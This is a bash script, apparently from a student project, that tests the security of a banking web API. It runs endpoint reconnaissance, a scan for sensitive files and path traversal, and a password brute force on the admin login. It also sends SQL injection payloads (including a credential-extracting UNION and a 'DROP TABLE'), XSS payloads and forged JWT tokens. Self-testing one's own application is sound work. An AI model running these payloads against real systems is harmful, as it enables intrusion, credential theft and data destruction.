#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════
#  RSS BANK — Suite complète de tests de sécurité (PFE)
#  Usage  : ./hack.sh [URL]
#  Défaut : URL = http://localhost:8000
#  Exemple: ./hack.sh http://192.168.1.50:8000
# ═══════════════════════════════════════════════════════════════

TARGET="${1:-http://localhost:8000}"
API="$TARGET/api"
DATE=$(date '+%Y-%m-%d %H:%M:%S')

# ── Couleurs ────────────────────────────────────────────────────
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'  # No Color

# ── Compteurs ───────────────────────────────────────────────────
TOTAL=0; VULN=0; OK=0; ERRORS=0

log_ok()   { echo -e "  ${GREEN}[OK]${NC}   $1"; ((TOTAL++)); ((OK++)); }
log_vuln() { echo -e "  ${RED}[!!]${NC}   $1"; ((TOTAL++)); ((VULN++)); }
log_err()  { echo -e "  ${YELLOW}[??]${NC}   $1"; ((TOTAL++)); ((ERRORS++)); }
log_info() { echo -e "  ${CYAN}[>>]${NC}   $1"; }

hr() { echo -e "${BOLD}────────────────────────────────────────────────────────────${NC}"; }

# ── Vérifier que curl est disponible ────────────────────────────
if ! command -v curl &>/dev/null; then
  echo "ERREUR : curl n'est pas installé." && exit 1
fi

# ════════════════════════════════════════════════════════════════
echo ""
echo -e "${BOLD}════════════════════════════════════════════════════════════${NC}"
echo -e "${BOLD}   RSS BANK — SUITE DE TESTS DE SÉCURITÉ (PFE)${NC}"
echo -e "${BOLD}════════════════════════════════════════════════════════════${NC}"
echo -e "  Cible   : ${CYAN}$TARGET${NC}"
echo -e "  Date    : $DATE"
echo -e "  SOC     : ${CYAN}${TARGET//:8000/:3000}/d/rss-bank-soc${NC}"
echo -e "${BOLD}════════════════════════════════════════════════════════════${NC}"


# ════════════════════════════════════════════════════════════════
#  1. RECONNAISSANCE
# ════════════════════════════════════════════════════════════════
echo ""
echo -e "${BOLD}[1/6] RECONNAISSANCE — Cartographie des endpoints${NC}"
hr

RECON_ENDPOINTS=(
  "/api/auth/login/"
  "/api/accounts/"
  "/api/users/"
  "/api/transactions/"
  "/api/admin/"
  "/admin/"
  "/api/schema/"
  "/api/schema/swagger-ui/"
)

for path in "${RECON_ENDPOINTS[@]}"; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 3 "$TARGET$path")
  if [[ "$CODE" == "000" ]]; then
    log_err "$path → Hors ligne / timeout"
  else
    log_info "$path → HTTP $CODE"
  fi
done


# ════════════════════════════════════════════════════════════════
#  2. SCAN D'ENDPOINTS SENSIBLES
# ════════════════════════════════════════════════════════════════
echo ""
echo -e "${BOLD}[2/6] SCAN D'ENDPOINTS SENSIBLES${NC}"
hr

SCAN_PATHS=(
  "/.env" "/config.php" "/wp-admin" "/phpmyadmin"
  "/backup.sql" "/.git/config" "/server-status"
  "/api/../../../etc/passwd" "/api/..%2F..%2Fetc%2Fpasswd"
)

for path in "${SCAN_PATHS[@]}"; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 3 "$TARGET$path")
  if [[ "$CODE" == "200" ]]; then
    log_vuln "Endpoint sensible accessible : $path (HTTP $CODE)"
  else
    log_ok "Bloqué : $path (HTTP $CODE)"
  fi
done


# ════════════════════════════════════════════════════════════════
#  3. BRUTE FORCE — Login endpoint
# ════════════════════════════════════════════════════════════════
echo ""
echo -e "${BOLD}[3/6] BRUTE FORCE — /api/auth/login/${NC}"
hr
log_info "Envoi de 25 tentatives de connexion échouées..."

WORDLIST=(
  "password" "123456" "password123" "admin" "admin123"
  "test123" "qwerty" "letmein" "123456789" "welcome"
  "monkey" "dragon" "master" "rss123" "bank123"
  "fintech" "mauritanie" "nouakchott" "Pass@123" "Sedad@2024"
  "trustno1" "hello123" "pass123" "test1234" "abcdef"
)

BF_FOUND=""
for pwd in "${WORDLIST[@]}"; do
  RESP=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$API/auth/login/" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@rss.mr\",\"password\":\"$pwd\"}")
  if [[ "$RESP" == "200" ]]; then
    BF_FOUND="$pwd"
    log_vuln "MOT DE PASSE TROUVÉ : $pwd (HTTP 200)"
    break
  fi
  printf "  \r  [>>]   Test : %-25s HTTP %s" "$pwd" "$RESP"
done

echo ""
if [[ -z "$BF_FOUND" ]]; then
  log_ok "25 mots testés — aucun accès obtenu (brute force détecté par SOC)"
fi


# ════════════════════════════════════════════════════════════════
#  4. INJECTION SQL
# ════════════════════════════════════════════════════════════════
echo ""
echo -e "${BOLD}[4/6] INJECTION SQL${NC}"
hr

SQL_PAYLOADS=(
  "' OR '1'='1"
  "' OR 1=1--"
  "' UNION SELECT 1,2,3--"
  "' UNION SELECT email,password,3 FROM core_user--"
  "'; DROP TABLE core_user;--"
  "1 AND 1=1"
  "1 AND 1=2"
  "admin'/*"
  "'; SELECT pg_sleep(3);--"
  "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--"
  "' OR 1=1 LIMIT 1 OFFSET 0--"
  "\" OR \"\"=\""
)

for payload in "${SQL_PAYLOADS[@]}"; do
  # Test sur login (body JSON)
  CODE=$(curl -s -o /dev/null -w "%{http_code}" --max-time 4 -X POST "$API/auth/login/" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$payload\",\"password\":\"x\"}")
  TIME=$(curl -s -o /dev/null -w "%{time_total}" --max-time 4 -X POST "$API/auth/login/" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$payload\",\"password\":\"x\"}" 2>/dev/null)

  SHORT="${payload:0:35}"
  if [[ "$CODE" == "500" ]]; then
    log_vuln "SQL: $SHORT → HTTP 500 (erreur serveur)"
  elif (( $(echo "$TIME > 2.5" | bc -l 2>/dev/null || echo 0) )); then
    log_vuln "SQL: $SHORT → Time-based (${TIME}s)"
  else
    log_ok "SQL: $SHORT → HTTP $CODE (protégé)"
  fi

  # Test aussi en query string sur accounts/
  CODE2=$(curl -s -o /dev/null -w "%{http_code}" --max-time 4 \
    "$API/accounts/?search=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null || echo "$payload")")
  if [[ "$CODE2" == "500" ]]; then
    log_vuln "SQL GET: $SHORT → HTTP 500"
  fi
done


# ════════════════════════════════════════════════════════════════
#  5. CROSS-SITE SCRIPTING (XSS)
# ════════════════════════════════════════════════════════════════
echo ""
echo -e "${BOLD}[5/6] CROSS-SITE SCRIPTING (XSS)${NC}"
hr

XSS_PAYLOADS=(
  '<script>alert("xss")</script>'
  '<img src=x onerror=alert(1)>'
  'javascript:alert(document.cookie)'
  '"><script>alert(1)</script>'
  '<svg onload=alert(1)>'
  '<iframe src=javascript:alert(1)>'
)

for payload in "${XSS_PAYLOADS[@]}"; do
  SHORT="${payload:0:40}"

  # Test sur login (body JSON)
  RESP=$(curl -s --max-time 4 -X POST "$API/auth/login/" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$payload\",\"password\":\"x\"}")
  CODE=$(echo "$RESP" | grep -o '"detail"' | head -1)

  # Vérifier si le payload est réfléchi dans la réponse
  if echo "$RESP" | grep -qF "$payload"; then
    log_vuln "XSS réfléchi : $SHORT"
  elif [[ "$(curl -s -o /dev/null -w '%{http_code}' --max-time 4 -X POST "$API/auth/login/" \
    -H 'Content-Type: application/json' \
    -d "{\"email\":\"$payload\",\"password\":\"x\"}")" == "500" ]]; then
    log_vuln "XSS → HTTP 500 (erreur)"
  else
    log_ok "XSS: $SHORT → Non réfléchi (protégé)"
  fi
done


# ════════════════════════════════════════════════════════════════
#  6. BYPASS AUTHENTIFICATION
# ════════════════════════════════════════════════════════════════
echo ""
echo -e "${BOLD}[6/6] BYPASS AUTHENTIFICATION${NC}"
hr

# Accès sans token
PROTECTED=("/api/accounts/" "/api/transactions/" "/api/users/me/" "/api/admin/")
for path in "${PROTECTED[@]}"; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 3 "$TARGET$path")
  if [[ "$CODE" == "401" || "$CODE" == "403" ]]; then
    log_ok "Protégé sans token : $path → HTTP $CODE"
  else
    log_vuln "Accessible sans token : $path → HTTP $CODE"
  fi
done

# Faux token JWT
CODE=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 3 \
  -H "Authorization: Bearer FAKE.JWT.TOKEN12345" "$API/accounts/")
if [[ "$CODE" == "401" || "$CODE" == "403" ]]; then
  log_ok "Faux token JWT rejeté → HTTP $CODE"
else
  log_vuln "Faux token JWT accepté ! → HTTP $CODE"
fi

# Token expiré simulé
CODE=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 3 \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMSIsImV4cCI6MH0.invalid" \
  "$API/accounts/")
if [[ "$CODE" == "401" || "$CODE" == "403" ]]; then
  log_ok "Token expiré rejeté → HTTP $CODE"
else
  log_vuln "Token expiré accepté ! → HTTP $CODE"
fi

# Path traversal
for pt in "/../../../etc/passwd" "/..%2F..%2F..%2Fetc%2Fpasswd" "/%2e%2e/%2e%2e/etc/passwd"; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 3 "$API$pt")
  if [[ "$CODE" == "200" ]]; then
    log_vuln "Path Traversal : /api$pt → HTTP 200 (CRITIQUE)"
  else
    log_ok "Path Traversal bloqué : /api$pt → HTTP $CODE"
  fi
done


# ════════════════════════════════════════════════════════════════
#  RAPPORT FINAL
# ════════════════════════════════════════════════════════════════
echo ""
echo -e "${BOLD}════════════════════════════════════════════════════════════${NC}"
echo -e "${BOLD}   RAPPORT FINAL — RSS BANK SOC${NC}"
echo -e "${BOLD}════════════════════════════════════════════════════════════${NC}"
echo -e "  Cible          : $TARGET"
echo -e "  Date           : $DATE"
echo -e "  Total tests    : $TOTAL"
echo -e "  ${GREEN}Protégés       : $OK${NC}"
echo -e "  ${RED}Vulnérables    : $VULN${NC}"
echo -e "  ${YELLOW}Erreurs        : $ERRORS${NC}"

if [[ $TOTAL -gt 0 ]]; then
  SCORE=$(( (OK * 100) / TOTAL ))
  echo ""
  if [[ $SCORE -ge 80 ]]; then
    echo -e "  ${GREEN}Score sécurité : $SCORE% — Bonne protection${NC}"
  elif [[ $SCORE -ge 60 ]]; then
    echo -e "  ${YELLOW}Score sécurité : $SCORE% — Protection moyenne${NC}"
  else
    echo -e "  ${RED}Score sécurité : $SCORE% — Protection insuffisante${NC}"
  fi
fi

echo ""
echo -e "  Dashboard SOC  : ${CYAN}${TARGET//:8000/:3000}/d/rss-bank-soc${NC}"
echo -e "  Logs sécurité  : tail -f backend/logs/security.log | python -m json.tool"
echo -e "${BOLD}════════════════════════════════════════════════════════════${NC}"
echo ""
